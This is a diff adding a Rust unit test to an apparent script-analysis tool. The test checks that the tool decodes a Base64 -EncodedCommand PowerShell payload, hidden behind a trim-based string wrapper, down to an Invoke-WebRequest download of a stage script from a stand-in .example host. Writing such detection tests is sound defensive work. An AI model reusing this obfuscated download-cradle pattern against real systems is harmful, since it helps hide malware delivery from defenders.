@@ -15990,6 +15990,38 @@ Clean '~~~{decoded}~~~' '~'"#
     }
 
     #[test]
+    fn ps1_literal_reordered_trim_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-trim-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($unused,$value,$chars) {{
+  return $value.Trim($chars)
+}}
+Clean 0 '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-reordered-trim-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal reordered trim extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_literal_constant_trim_extractor_call_recovers_nested_command() {
         use base64::Engine;
 
